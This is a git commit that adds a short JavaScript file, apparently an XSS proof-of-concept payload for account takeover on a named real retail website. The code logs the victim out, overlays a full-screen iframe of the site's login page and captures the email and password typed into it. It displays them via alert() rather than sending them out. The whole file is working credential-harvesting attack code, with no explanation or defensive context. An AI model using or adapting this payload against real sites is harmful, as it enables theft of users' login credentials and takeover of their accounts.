47b7e4625051f1c64ebf9b21f94a45c47e6736e1
bbpa <57352896+bbpa@users.noreply.github.com>
2024-05-24 03:05:22 +0330

    Create ato.js

---
+++ ato.js
@@ -0,0 +1,17 @@
+let img=new Image();img.src="https://www.puritan.com/login/logout";
+window.setTimeout(()=>{
+let iframe=document.createElement("iframe");
+iframe.src="https://www.puritan.com/login"
+iframe. style="position: fixed; top:0; left:0; bottom:0; right:0; width: 100%; height:100%; border:none; margin:0; padding:0; overflow: hidden; z-index:999999;";
+document.body.appendChild(iframe)
+iframe.contentWindow.addEventListener("DOMContentLoaded", () => {
+let loginbutton=iframe.contentWindow.document.getElementById("login_submit");
+loginbutton.onclick=()=>
+{
+let email=iframe.contentWindow.document.getElementById("Email").value;
+let pass=iframe.contentWindow.document.getElementById("Password").value;
+alert(`${email} : ${pass}`)
+}
+
+})
+},3000)
